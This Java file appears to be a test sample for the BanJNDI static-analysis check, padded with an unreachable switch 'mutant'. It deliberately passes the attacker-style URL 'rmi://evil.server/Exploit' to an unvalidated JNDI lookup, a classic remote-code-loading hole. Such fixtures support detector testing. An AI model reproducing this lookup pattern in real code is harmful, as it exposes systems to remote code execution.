import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    private boolean getFalseCondition() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI

        // Mutant: Unreachable switch statement
        int value = 1;
        boolean condition = getFalseCondition();
        if (condition) {
            switch (value) {
                case 1:
                    // This case is unreachable
                    System.out.println("Unreachable code");
                    break;
            }
        }

        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}